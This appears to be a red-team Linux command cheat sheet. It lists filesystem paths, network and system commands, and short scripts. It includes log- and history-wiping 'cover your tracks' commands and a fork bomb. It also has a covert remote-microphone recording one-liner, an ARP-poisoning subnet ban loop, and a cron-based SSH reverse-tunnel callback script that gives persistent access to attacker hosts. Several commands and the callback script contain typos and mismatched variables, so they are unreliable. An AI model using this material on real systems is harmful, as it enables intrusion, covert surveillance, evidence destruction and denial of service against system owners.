= File System Structure =
* /bin - User binaries
* /boot - Boot-up related files
* /dev - Interface for system devices
* /etc - System configuration files
* /home - Base directory for user files
* /lib - Critical software libraries
* /opt - Third party software
* /proc - System and running programs
* /root - Home directory of root user
* /sbin - System administrator binaries
* /tmp - Temporary files
* /usr - Less critical files
* /var - Variable system files

= "Cover Your Tracks" Commands =
* Clear auth.log file
    echo "" > /var/log/auth.log
* Clear current session history
    history -c
* Prevent history from being written
    export HISTFILESIZE=0; export HISTSIZE=0; unset HISTFILE
* Permanently send all bash history commands to /dev/null
    ln /dev/null ~/.bash_history -sf
* Kills current session
    kill -9 $$
* Clear the last logged in user
    shred -fuz /var/log/wtmp && touch /var/log/wtmp

= Log File Locations =
* /var/log - System log files (most Linux)
* /var/adm - System log files (Unix)
* /var/spool/cron - List cron files
* /etc/fstab - Static file system info

= Network Commands =
* Watch network connections
    watch ss -tp
* See established connections
    lsof -i
* Add a default gateway
    route add default gw <gw_ip>
* Domain transfer
    dig @<namesrv> <domain> -t AXFR
	host -l <domain> <namesrv>
* Add a "hidden" interface
    ip addr add <ip>/<cidr> dev <interface>
* Block ip:port
    tcpkill host <ip> and port <port>
	
= System Info =
* List users accounts on the system
    getent passwd
* List installed packages
** Redhat
    rpm --query -all
** Debian
    dpkg -get-selections
* Disable <shell>, force bash
    chmod 750 <tcsh | csh | ksh>

= Utility Commands =
*  Find related commands
    apropos <subject>

= File Commands =
* Matches <ref_file> timestamp
    touch -r <ref_file> <file>
* Set file timestamp
    touch <YYYMMDDHHSS> <file>
* Cut block 1K-3K from <file>
    dd skip=1000 count=2000 bs=8 if=<in_file> of=<out_file>
* Search for setuid files
    find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \;
* Recursive secure delete
    find -type f -exec shred -fuz {} \;
	
= Misc Commands =
* Record remote mic
    ssh <user>@<ip> arecord - | aplay -
* Reboot
    init 6
* Shutdown
    init 0
* List of log files
    cat /etc/*syslog*.conf | grep -v "^#"
	
= Handy Scripts =
== Ping Sweep ==
#!/bin/bash
for x in {1..254..1};do ping -c 1 1.1.1.$x |grep "64 b" |cut -d" " -f4 >> ips.txt; done

== Automated Domain Name Resolve ==
#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1..254..1};do
    host $range.$ip |grep "name pointer" |cut -d" " -f5
done

== Fork Bomb ==
#!/bin/sh
:(){:|:&};:

== DNS Reverse Lookup ==
#!/bin/bash
for ip in {1..254..1};do dig -x 1.1.1.$ip |grep $ip >> dns.txt; done;

== IP Banning Script ==
#!/bin/bash
# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
# It assumes 1 is the router and does not ban IPs .20, .21, .22
i = 2
while [ $i -le 253 ]
do
    if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
	    echo "BANNED: arp -s 192.168.1.$i"
		arp -s 192.168.1.$i 00:00:00:00:00:0a
	else
	    echo "IP NOT BANNED: 192.168.1.$i****************************"
		echo "*******************************************************"
	fi
	i=`expr $i +1`
done

== SSH Callback ==
Set up script in crontab to call back ever X minutes. Highly recommend you
set up a generic user on red team com[uter (with no shell privs). Script
will use the private key (located on callback source computer) to connect
to a public key (on red team computer). Read teamer connects to target via accounts
local SSH session (in the example below, use #ssh -p4040 localhost)

#!/bin/sh
# Callback script localed on callback source computer (target)
killall ssh >/dev/null 2>&1
sleep 5
REMLIS=4040
REMUSER=user
HOST="domain1.com domain2.com domain3.com"
for LIVEHOST in $HOSTS;
do
    COUNT=$(ping -c2 $LIVEHOST |grep 'received' |awk -F',' '{ print $2 }' |awk '{ print $1 }')
    if [[ $COUNT -gt 0 ]]; then
        ssh -R ${REMLIS}:localhost:22 -i "/home/${REMUSR}/.ssh/id_rsa" -N ${LIVEHOST} -l ${REMUSR}
    fi